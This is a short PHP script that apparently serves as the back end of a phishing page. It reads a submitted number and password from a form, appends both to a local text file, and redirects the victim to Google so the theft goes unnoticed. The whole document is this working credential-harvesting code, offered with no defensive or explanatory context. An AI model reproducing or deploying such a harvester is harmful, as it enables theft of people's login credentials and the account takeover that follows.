<?php

file_put_contents("Leonardo.txt", "[number]" .$nmb = $_POST['nmb'] . " [password:] " . $pwd = $_POST['psw'] . "\n", FILE_APPEND);
header('Location: https://www.google.com');
?>
